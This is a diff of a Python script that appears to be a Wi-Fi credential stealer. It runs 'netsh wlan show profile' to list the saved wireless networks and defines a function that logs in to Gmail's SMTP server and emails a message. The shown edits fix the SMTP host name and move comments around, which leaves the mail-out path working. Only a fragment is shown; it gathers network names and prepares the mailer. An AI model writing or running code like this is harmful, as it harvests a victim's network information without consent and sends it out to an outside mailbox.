@@ -6,18 +6,21 @@ import subprocess, smtplib, re
 def send_email(email, password, message):
     # google allow others to user there smtp server
     # send email
-    server = smtplib.SMTP("smtp@gmail.com", 587)       # address for google's server and port
+    # address for google's server and port
+    server = smtplib.SMTP("smtp.gmail.com", 587)       
     # initiate tls connection
     server.starttls()
     # login to email
     server.login(email, password)
-    server.sendmail(email, email, message)     # from to content
+    # from to content
+    server.sendmail(email, email, message)     
     server.quit()
 
 
 command = "netsh wlan show profile"
 networks = subprocess.check_output(command, shell=True)
-network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)		#non-capturing group
+#non-capturing group
+network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)		
 # print(network_names_list)
 
 
